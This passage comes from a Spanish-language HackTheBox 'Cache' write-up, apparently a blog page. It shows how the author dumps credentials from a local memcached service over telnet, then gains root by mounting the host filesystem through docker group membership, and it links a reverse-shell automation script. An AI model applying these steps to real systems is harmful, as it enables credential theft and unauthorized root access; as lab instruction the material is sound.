+<p>Podríamos intentar con mysql ver si <strong>luffy</strong> está en la base de datos y obtener su password, pero no tendría sentido que (en caso de estar) la contraseña nos funcione, ya que sería una contraseña pero de <em>openemr</em> ósea del login y necesitamos una pero del sistema.</p>
+
+<p>Validando <strong>memcached</strong> por internet, la definición nos la da claramente el mismo <a href="http://memcached.org/">soporte</a>.</p>
+
+<blockquote>
+  <p>Sistema de almacenamiento en caché… Diseñado para acelerar las aplicaciones web dinámicas aliviando la carga de la base de datos.</p>
+</blockquote>
+
+<p>Pues esto ya suena raro e interesante. Previamente había visualizado con <code>$ netstat -a</code> que el puerto <strong>11211</strong> estaba a la escucha en local y siguiendo este informe (u otros) podemos ver que <strong>memcached</strong> usa ese puerto, los pasos para usarlo están en el mismo informe.</p>
+
+<ul>
+  <li><a href="https://techleader.pro/a/90-Accessing-Memcached-from-the-command-line">Tutorial: Accessing-Memcached-from-the-command-line</a>.</li>
+</ul>
+
+<p>Demosle</p>
+
+<pre><code class="language-bash">$ telnet localhost 11211
+...
+...
+&gt; stats # Vemos estadisticas importantes del servidor que corre Memcached
+...
+STAT pid 979
+STAT uptime 7565
+STAT time 1599596958
+STAT version 1.5.6 Ubuntu
+...
+...
+END
+&gt; stats slabs # La data es guardada en "slabs" que serian como particiones en memoria
+...
+...
+...
+STAT 1:total_chunks 10922
+STAT 1:used_chunks 5
+STAT 1:free_chunks 10917
+STAT 1:free_chunks_end 0
+STAT 1:mem_requested 371
+STAT 1:get_hits 8
+...
+END
+# Vemos que solo tenemos un solo "slab (el numero al lado de STAT)" que tiene varios items, ahora podemos dumpear data con ese número
+...
+&gt; stats cachedump 1 0 # El 1 es el ID del "slab" y con el 0 le indicamos que muestre todos los items
+ITEM link [21 b; 0 s]
+ITEM user [5 b; 0 s]
+ITEM passwd [9 b; 0 s]
+ITEM file [7 b; 0 s]
+ITEM account [9 b; 0 s]
+END
+&gt; get user # Con esto simplemente le decimos que nos muestre que tiene ese item
+VALUE user 0 5
+luffy
+END
+&gt; get passwd
+VALUE passwd 0 9
+0n3_p1ec3
+END
+&gt; get file 
+VALUE file 0 7
+nothing
+END
+&gt; get link
+VALUE link 0 21
+https://hackthebox.eu
+END
+&gt; get account
+VALUE account 0 9
+afhj556uo
+END
+</code></pre>
+
+<p>Obtuvimos una contraseña guardada en memoria del usuario <strong>luffy</strong>, validemos si funciona</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/cache/revshsuluffy.png" alt="revshsuluffy" /></p>
+
+<p>…</p>
+
+<h2 id="escalada-de-privilegios">Escalada de privilegios</h2>
+
+<p>Muy bien, muy bien… Vemos que tiene asignado el grupo <strong>docker</strong>, a hacer research y ver como podemos explotar eso… Hay varios blogs donde nos explican como vulnerar esto, necesitamos saber que <code>images</code> tiene docker, para posteriormente ejecutar un truco con el cual docker permite crear una montura de un archivo o directorio, y pues como para ejecutar <strong>docker</strong> se necesita ser administrador o estar en el grupo <strong>docker</strong> (que sería lo mismo que ser administrador)… Entonces lo que ejecutemos con docker será llevado a cabo con permisos de administrador (:</p>
+
+<blockquote>
+  <p>Una <em>imagen</em> podría contener un sistema operativo Ubuntu con un servidor Apache y tu aplicación web instalada. Las imágenes se utilizan para crear contenedores, y nunca cambian”. <a href="https://www.javiergarzas.com/2015/07/entendiendo-docker.html">JavierGarzas.com</a></p>
+</blockquote>
+
+<p>Algunos artículos que encontré explicando la vulnerabilidad:</p>
+
+<ul>
+  <li><a href="https://www.electricmonk.nl/log/2017/09/30/root-your-docker-host-in-10-seconds-for-fun-and-profit/">root-your-docker-host-in-10-seconds-for-fun-and-profit</a>.</li>
+  <li><a href="https://fosterelli.co/privilege-escalation-via-docker">privilege-escalation-via-docker</a>.</li>
+  <li><a href="https://blog.martiert.com/the-docker-group-and-privilege-escalation/">the-docker-group-and-privilege-escalation</a>.</li>
+</ul>
+
+<p>Entonces… Necesitamos una imagen, podemos ver las que tiene la máquina con:</p>
+
+<pre><code class="language-bash">$ docker images
+</code></pre>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/cache/revshdockimgs.png" alt="revshdockimgs" /></p>
+
+<p>Y ahora podemos decirle a docker que nos cree una montura en la que (mientras estemos conectados a docker) nos haga un espejo de (en este caso) toda la raíz del sistema en el directorio <code>/tmp/</code>, por lo que al ingresar a <em>tmp/</em> veremos la copia de los archivos y podremos recorrerla con una Shell :) como <strong>root</strong></p>
+
+<ul>
+  <li><a href="https://docs.docker.com/engine/reference/run/">Documentación <strong>docker run</strong></a>.</li>
+  <li><a href="https://docs.docker.com/storage/volumes/">Info sobre <strong>volumes</strong></a>.</li>
+</ul>
+
+<pre><code class="language-bash">$ docker run -it --volume /:/tmp/ ubuntu:latest
+</code></pre>
+
+<ul>
+  <li><strong>-i</strong> : El que nos permite interactuar escribiendo</li>
+  <li><strong>-t</strong> : Permite tener una pseudo consola</li>
+  <li><strong>–volume</strong> : El responsable de la montura</li>
+  <li><strong>ubuntu:latest</strong> : La imagen que enumeramos</li>
+</ul>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/cache/revshdockroot.png" alt="revshdockroot" /></p>
+
+<p>Opaaaaaaa que hermosa forma de escalar privilegios. Ahora simplemente nos faltaría ver las flags :)</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/cache/revshflags.png" alt="revshflags" /></p>
+
+<p>Pero no tenemos una Shell interactiva, acá podríamos hacer varias cosas, pasarla a interactiva, subir el binario de netcat, crear un usuario en el sistema con privilegios para evitar hacer el proceso con docker y varias cositas más…</p>
+
+<p>…</p>
+
+<p>Acá el script que automatiza la subida del archivo y genera la petición para obtener la Shell. Así que debes ponerte en escucha y ejecutarlo</p>
+
+<blockquote>
+  <p><a href="https://github.com/jntxJ/Writeups/blob/master/HTB/Cache/fileup2revsh.py">fileup2revsh.py</a>.</p>
+</blockquote>
+
+<p>…</p>
+
+<p>Una muy bonita maquina, la elevación con <strong>docker</strong> me fascino, el inicio casi me hace llorar pero se logró. En general muy buena maquina, linda linda.</p>
+
+<p>Bueeeno como siempre digo, gracias por leerme, espero haber aportado algo, y ya sabes, a seguir rompiendo todo (:</p>
+
+</div>
+
+<!-- Rating -->
+
+
+<!-- Author Box if enabled from _config.yml -->
+<!-- Author Box -->
+
+
+
+
+<!-- Comments if not disabled with comments: false -->
+<!-- Comments
+================================================== -->
+ 
+<div class="comments">
+    <button class="btn btn-dark show-comments">Comentarios</button>         
+    <div id="comments">  
+        <h4 class="mb-4">Comments</h4>                 
+            <section class="disqus">
+    <div id="disqus_thread"></div>
+    <script type="text/javascript">
+        var disqus_shortname = 'demowebsite'; 
+        var disqus_developer = 0;
+        (function() {
+            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+            dsq.src = window.location.protocol + '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        })();
+    </script>
+    <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+    <a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</section>
+     
+    <div class="clearfix"></div>              
+    </div>    
+</div>       
+
+
+<!-- Share -->
+<div class="share">
+    <p>
+        Vacios
+    </p>
+    <ul>
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://twitter.com/intent/tweet?text=HackTheBox - Cache&url=http://localhost:4000/htb/cache" onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+                <i class="fab fa-twitter"></i>
+            </a>
+        </li>
+
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://www.hackthebox.eu/profile/73707" onclick="window.open(this.href, 'width=550,height=435');return false;">
+                <i class="fas fa-cube"></i>
+            </a>
+        </li>
+
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://github.com/lanzt" onclick="window.open(this.href, 'width=550,height=435');return false;">
+                <i class="fab fa-github"></i>
+            </a>
+        </li>
+
+    </ul>
+</div>
+
+
+<!-- Related Post -->
+<!-- Related Posts
+================================================== -->
+<div class=" related-posts ">  
+
+    
+    <h2 class="text-center mb-4">Posts relacionados a este (o se hace el intento).</h2>
+    
+    
+    <div class="d-flex justify-content-center align-items-center">
+
+    <!-- Tags -->  
+    
+                    
+    <a class="smoothscroll badge badge-primary" href="/tags#SQLi">SQLi</a>               
+                    
+    <a class="smoothscroll badge badge-primary" href="/tags#docker">docker</a>               
+                    
+    <a class="smoothscroll badge badge-primary" href="/tags#memcached">memcached</a>               
+    
+    
+    <!-- Categories -->
+    
+    
+    <a class="smoothscroll badge badge-primary" href="/categories#htb">htb</a>                
+    
+
+    </div>
+
+    
+    
+    
+    <div class="blog-grid-container">
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+            <!-- begin post -->
+
+
+<div class="blog-grid-item">
+    <div class="card h-100">
+        <div class="maxthumb">
+            <a href="/htb/proper">
+                
+
+                    
+                        <img class="img-thumb" src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/proper/321banner.png" alt="HackTheBox - Proper"> 
+                    
+
+                
+            </a>
+        </div>
+        <div class="card-body">
+            <h2 class="card-title">
+                <a class="text-dark" href="/htb/proper">HackTheBox - Proper</a>
+                
+            </h2>
+            <h4 class="card-text">Máquina Windows nivel difícil. Agregamos sal a nuestra inyección SQL, jugaremos a ganar la race condition y finalmente entre reversing, movimiento lateral, creación de scripts en PowerShell y pipes conseguiremos...</h4>
+        </div>
+        <div class="card-footer bg-white">
+            <div class="wrapfooter">
+                
+                <span class="meta-footer-thumb">
+                
+                <img class="author-thumb" src="https://www.gravatar.com/avatar/e56154546cf4be74e393c62d1ae9f9d4?s=250&d=mm&r=x" alt="Sh0x">
+                
+                </span>
+                <span class="author-meta">
+                <span class="post-name"><a target="_blank" href="">Sh0x</a></span> 
+                
+                <span class="post-date">21 Aug 2021</span>
+                </span>
+                <div class="clearfix"></div>
+            </div>
+        </div>
+    </div>
+</div>
+<!-- end post -->
+            
+            
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+            <!-- begin post -->
+
+
+<div class="blog-grid-item">
+    <div class="card h-100">
+        <div class="maxthumb">
+            <a href="/htb/thenotebook">
+                
+
+                    
+                        <img class="img-thumb" src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/thenotebook/320banner.png" alt="HackTheBox - TheNotebook"> 
+                    
+
+                
+            </a>
+        </div>
+        <div class="card-body">
+            <h2 class="card-title">
+                <a class="text-dark" href="/htb/thenotebook">HackTheBox - TheNotebook</a>
+                
+            </h2>
+            <h4 class="card-text">Máquina Linux nivel medio. Exploraremos el mundo de los JSON Web Tokens para ingresar a una web con permisos administrativos. Jugaremos con llaves SSH y romperemos el siempre fiel Docker...</h4>
+        </div>
+        <div class="card-footer bg-white">
+            <div class="wrapfooter">
+                
+                <span class="meta-footer-thumb">
+                
+                <img class="author-thumb" src="https://www.gravatar.com/avatar/e56154546cf4be74e393c62d1ae9f9d4?s=250&d=mm&r=x" alt="Sh0x">
+                
+                </span>
+                <span class="author-meta">
+                <span class="post-name"><a target="_blank" href="">Sh0x</a></span> 
+                
+                <span class="post-date">31 Jul 2021</span>
+                </span>
+                <div class="clearfix"></div>
+            </div>
+        </div>
+    </div>
+</div>
+<!-- end post -->
+            
+            
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+            <!-- begin post -->
+
+
+<div class="blog-grid-item">
+    <div class="card h-100">
+        <div class="maxthumb">
+            <a href="/htb/giddy">
+                
+
+                    
+                        <img class="img-thumb" src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/giddy/153banner.png" alt="HackTheBox - Giddy"> 
+                    
+
+                
+            </a>
+        </div>
+        <div class="card-body">
+            <h2 class="card-title">
+                <a class="text-dark" href="/htb/giddy">HackTheBox - Giddy</a>
+                
+            </h2>
+            <h4 class="card-text">Máquina Windows nivel medio. Jugaremos con inyecciones SQL del servicio MSSQL. Pero no vamos dumpear bases de datos, nop, vamos a ejecutar comandos :o que serán interceptados (smbclient y responder)...</h4>
+        </div>
+        <div class="card-footer bg-white">
+            <div class="wrapfooter">
+                
+                <span class="meta-footer-thumb">
+                
+                <img class="author-thumb" src="https://www.gravatar.com/avatar/e56154546cf4be74e393c62d1ae9f9d4?s=250&d=mm&r=x" alt="Sh0x">
+                
+                </span>
+                <span class="author-meta">
+                <span class="post-name"><a target="_blank" href="">Sh0x</a></span> 
+                
+                <span class="post-date">27 Jul 2021</span>
+                </span>
+                <div class="clearfix"></div>
+            </div>
+        </div>
+    </div>
+</div>
+<!-- end post -->
+            
+            
+                
+        </div>        
+</div>
+
+<!-- Review with LD-JSON, adapt it for your needs if you like, but make sure you test the generated HTML source code first: 
+https://search.google.com/structured-data/testing-tool/u/0/
+================================================== -->
+
+    </div>
+
+    
+    <!-- Newsletter
+    ================================================== -->
+    <div class="newsletter text-center">
+        <span class="h4"><img src="/assets/images/sh0x.png" class="newsletter-logo" alt="Sh0x blog"></span>
+        <p></p>
+    </div>
+    
+    
+</div>
+
+<!-- Begin Footer
+================================================== -->
+<footer class="footer">
+    <div class="container">
+        <div class="row">
+            <div class="col-md-6 col-sm-12 text-center text-lg-left">
+                Copyright © 2022 Sh0x blog 
+            </div>
+            <div class="col-md-6 col-sm-12 text-center text-lg-right">    
+                <a target="_blank" href="https://www.wowthemes.net/memoirs-free-jekyll-theme/">Memoirs Jekyll Theme</a> by WowThemes.net
+            </div>
+        </div>
+    </div>
+</footer>
+<!-- End Footer
+================================================== -->
+
+</div> <!-- /.site-content -->
+
+<!-- Scripts (if you need bootstrap.js, please add it yourself. I didn't use it for performance reasons, it was not needed in this theme)
+================================================== -->
+
+<script src="/assets/js/prism.js"></script>
+
+<script src="/assets/js/theme.js"></script>
+
+
+
+
+<script id="dsq-count-scr" src="//demowebsite.disqus.com/count.js"></script>
+
+
+</body>
+</html>
